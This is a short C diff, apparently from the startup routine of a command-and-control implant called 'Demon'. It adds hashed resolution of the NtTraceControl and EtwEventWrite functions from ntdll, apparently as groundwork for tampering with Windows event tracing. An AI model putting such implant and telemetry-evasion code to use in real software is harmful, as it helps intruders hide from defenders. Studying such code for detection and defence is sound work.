@@ -360,6 +360,8 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.NtQueryInformationThread          = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
         Instance->Win32.NtQueryObject                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
         Instance->Win32.NtTraceEvent                      = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTTRACEEVENT );
+        Instance->Win32.NtTraceControl                    = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTTRACECONTROL );
+        Instance->Win32.EtwEventWrite                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_ETWEVENTWRITE );
     } else {
         PUTS( "Failed to load ntdll from PEB" )
         return;
